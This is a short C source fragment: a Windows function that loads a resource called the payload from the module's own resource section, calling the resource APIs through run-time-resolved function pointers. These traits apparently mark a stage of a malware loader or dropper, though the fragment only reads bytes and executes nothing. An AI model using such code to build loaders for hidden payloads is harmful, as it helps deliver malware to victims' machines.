BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
    HRSRC hRes;
    HGLOBAL hResLoad;
    
    DEBUG_PRINT("LoadData: Attempting to load payload from resource section...");

    hRes = pfnFindResourceA(g_hModule, MAKEINTRESOURCE(PAYLOAD_RESOURCE_ID), RT_RCDATA);
    if (hRes == NULL) {
        DEBUG_PRINT("LoadData: FindResourceA failed. Could not find payload resource in module %p.", g_hModule);
        return FALSE;
    }

    hResLoad = pfnLoadResource(g_hModule, hRes);
    if (hResLoad == NULL) {
        DEBUG_PRINT("LoadData: LoadResource failed.");
        return FALSE;
    }

    *ppData = (PBYTE)pfnLockResource(hResLoad);
    if (*ppData == NULL) {
        DEBUG_PRINT("LoadData: LockResource failed.");
        return FALSE;
    }

    *pdwDataSize = pfnSizeofResource(g_hModule, hRes);
    if (*pdwDataSize == 0) {
        DEBUG_PRINT("LoadData: SizeofResource returned 0.");
        return FALSE;
    }

    DEBUG_PRINT("LoadData: Successfully loaded %lu bytes from resource ID %d.", *pdwDataSize, PAYLOAD_RESOURCE_ID);
    return TRUE;
}
